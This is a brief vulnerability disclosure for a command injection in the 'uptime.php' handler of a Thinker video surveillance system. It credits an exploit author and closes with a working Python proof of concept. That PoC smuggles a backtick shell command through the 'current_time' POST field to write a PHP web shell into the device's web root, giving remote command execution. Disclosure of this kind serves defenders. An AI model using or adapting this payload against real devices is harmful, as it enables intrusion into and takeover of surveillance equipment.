# Thinker Video Surveillance System  Command Injection

**Vender** ：Thinker

**Firmware version**:	lastest

**Exploit Author**: Gqleung@hillstone

**Vendor Homepage**: http://thinker.cn/

## detail description

An issue was discovered on Thinker   devices. An HTTP request parameter is used in command string  construction in the handler function of the `uptime.php`. This could lead to command injection via shell metacharacters in  the `$_POST['current_time']`.

## POC

```python
import requests

url="http://10.10.15.9/uptime.php"
data={
	'current_time':'2022-03-21 22:01:40 `echo "<?php echo system(\$_GET[1]);?>">/usr/local/app/htdocs/shell.php`'
}
r = requests.post(url,data=data)
print(r.text)
```

